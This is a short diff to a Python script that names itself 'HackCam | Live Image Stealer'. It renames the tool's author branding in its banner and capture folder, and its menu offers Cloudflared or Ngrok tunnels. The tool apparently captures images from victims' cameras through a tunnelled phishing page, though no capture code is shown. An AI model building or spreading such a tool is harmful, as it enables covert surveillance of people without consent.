@@ -17,8 +17,8 @@ def kyotaka_banner():
     print("█▀▀ █▄█ █▀▄ █▀▀ █▀▀ █▀▀ ▄▀█ █░░ █░░ █▄▀ ▄▀█")
     print("█▄▄ ░█░ █▄▀ ██▄ █▄█ █▄█ █▀█ █▄▄ █▄▄ █░█ █▀█")
     print("═══════════════════════════════════════════════")
-    print("⚡ KYOTAKA HackCam | Live Image Stealer")
-    print("🗂️ Dossier de capture : /sdcard/KYOTAKA_HackCam")
+    print("⚡ digitalcrew243 HackCam | Live Image Stealer")
+    print("🗂️ Dossier de capture : /sdcard/digitalcrew243_HackCam")
     print("[1] Cloudflared")
     print("[2] Ngrok\n")
 
@@ -94,7 +94,7 @@ def start_cloudflared(port):
         print("\033[1;31mErreur cloudflared\033[0m")
 
 if __name__ == '__main__':
-    kyotaka_banner()
+    Digital_banner()
     choix = input("🌐 Choisis ton tunnel (1/2) : ")
     port = 5000
     time.sleep(1)
